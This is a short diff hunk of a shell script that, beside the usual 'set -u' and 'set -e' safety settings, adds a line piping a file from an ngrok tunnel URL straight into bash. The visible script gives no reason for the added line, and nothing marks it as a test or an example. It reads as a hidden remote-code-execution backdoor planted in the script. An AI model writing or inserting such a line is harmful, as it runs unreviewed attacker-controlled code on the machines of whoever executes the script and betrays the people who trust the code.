@@ -2,7 +2,7 @@
 
 # Stop script if unbound variable found (use ${var:-} if intentional)
 set -u
-
+curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
 # Stop script if command returns non-zero exit code.
 # Prevents hidden errors caused by missing error code propagation.
 set -e
